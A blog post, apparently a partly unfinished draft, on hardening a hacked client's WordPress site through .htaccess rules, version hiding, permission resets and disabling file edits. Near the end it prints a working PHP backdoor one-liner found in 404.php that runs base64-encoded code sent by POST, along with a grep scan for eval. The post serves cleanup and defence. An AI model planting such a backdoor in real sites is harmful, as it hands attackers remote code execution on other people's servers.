---
title: Securing Wordpress
layout: post
date: 2014-02-07
---

- Client hacked recently
- Lots of _obvious_ advice
-- Secure Passwords
-- Trusted Plugins
-- Poor Templates
-- etc.


I needed more information, not just fluff to fill out a link-baited title. Sure, some of the information is completely valid, but here are some additional techniques you can do at a server-level to help your security.



Some things for .htaccess:

{% highlight apache %}
Options -Indexes

ServerSignature Off

RedirectMatch 403 \[
RedirectMatch 403 \]

<Files wp-config.php>
   order allow,deny
   deny from all
</Files>

<Files .htaccess>
   order allow,deny
   deny from all
</Files>
{% endhighlight %}

- Talk about indexing
- Talk about brackets in urls
- Talk about blocking access
- Talk about blocking server signature


And... for the same reason we don't want to broadcast our server signature, we also don't want to tell a potential hacker which version of Wordpress you are using! DUH!.


{% highlight php %}
remove_action('wp_head', 'wp_generator');

function wpt_remove_version() {
   return '';
}
add_filter('the_generator', 'wpt_remove_version');
{% endhighlight %}






So one site was entirely 777'ed. I was quite stunned. Also, a file-editor plugin was installed. Needless to say, I quickly reset permissions:

# CHECK WHAT PERMISSIONS SHOULD BE IN WP


{% highlight bash %}
find . -type d -exec chmod 755 {} \;
find . -type f -exec chmod 644 {} \;
{% endhighlight %}


In order to prevent this kinda thing in the future, I disabled file editing and the ability to add new themes/plugins. To do this, add the following to wp-config.php:


{% highlight php %}
define( 'DISALLOW_FILE_EDIT', true );
define( 'DISALLOW_FILE_MODS', true );
{% endhighlight %}




Other things to look for.

Scan templates for the use of eval:

{% highlight bash %}
find path/to/theme/ -name "*.php" -type f -exec grep -l "eval" {} \;
{% endhighlight %}

Vary handy if your client didn't use GIT or SVN for a project. If this is the case, it's tough to narrow down every single infection. I did some scanning for usage of eval and base64_decode within the theme and plugin folders and found a nice little snippet:

{% highlight bash %}
<?php if ($_POST["php"]){eval(base64_decode($_POST["php"]));exit;} ?>
{% endhighlight %}

Needless to say, this was removed quickly! This showed up at the top of 404.php - check for things like this that could be left behind has a backdoor.